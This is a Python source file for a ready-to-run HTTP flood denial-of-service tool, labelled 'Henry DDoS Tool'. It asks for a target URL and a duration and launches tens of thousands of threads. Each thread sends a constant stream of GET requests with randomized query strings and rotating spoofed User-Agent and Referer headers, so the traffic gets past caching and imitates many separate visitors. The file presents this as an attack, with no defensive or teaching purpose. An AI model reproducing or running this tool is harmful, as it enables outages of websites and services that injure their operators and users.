import requests
import threading
import random
import time
import os
from urllib.parse import urlparse
import psutil

__version__ = "1.0.1"
accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
]

headers_useragents = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
]

cur = 0
request_success = 0
request_error = 0
safe = False
target = ""

def build_block(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def http_call(url, headers):
    global cur, request_success, request_error, safe
    parsed_url = urlparse(url)
    param_joiner = '&' if '?' in url else '?'
    client = requests.Session()

    while True:
        try:
            q_url = url + param_joiner + build_block(random.randint(3, 10)) + "=" + build_block(random.randint(3, 10))
            user_agent = random.choice(headers_useragents)
            referer = random.choice(headers_referers) + build_block(random.randint(5, 10))

            headers.update({
                "User-Agent": user_agent,
                "Cache-Control": "no-cache",
                "Accept-Charset": accept_charset,
                "Referer": referer,
                "Keep-Alive": str(random.randint(100, 110)),
                "Connection": "keep-alive",
                "Host": parsed_url.netloc
            })

            response = client.get(q_url, headers=headers, timeout=5)
            cur += 1
            request_success += 1

            if safe and response.status_code >= 500:
                break

        except requests.exceptions.RequestException:
            request_error += 1

        time.sleep(0.001)

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    ========================================
    |         Henry DDoS Tool v1.0.1       |
    |           Cre By @HaiBe              |
    ========================================
    """)

def worker_threads():
    global target
    headers = {}

    for _ in range(30):
        threading.Thread(target=thread_worker, args=(target, headers)).start()
        time.sleep(0.1)

def thread_worker(target, headers):
    threads = []
    for _ in range(950):
        t = threading.Thread(target=http_call, args=(target, headers))
        t.daemon = True
        threads.append(t)

    for t in threads:
        t.start()

def main():
    global target, cur, request_success, request_error
    banner()
    target = input("Input Target: ")
    duration = int(input("Enter Duration: "))
    start_time = time.time()
    worker_threads()

    try:
        while time.time() - start_time < duration:
            time.sleep(1)
            cpu_usage = psutil.cpu_percent(interval=1)
            print(f"\rCpu: {cpu_usage}% | Successfully Requests: {request_success} | Error Requests: {request_error}", end="")

        print("\nAttack Stop | (y) To Back Home . (n) Exit")
        choice = input().strip().lower()

        if choice == 'y':
            cur = 0
            request_success = 0
            request_error = 0
            main()
        elif choice == 'n':
            print("Exiting...")
            os._exit(0)

    except KeyboardInterrupt:
        print("\nAttack Stop | (y) To Back Home . (n) Exit")
        choice = input().strip().lower()

        if choice == 'y':
            cur = 0
            request_success = 0
            request_error = 0
            main()
        elif choice == 'n':
            print("Exiting...")
            os._exit(0)

if __name__ == "__main__":
    main()
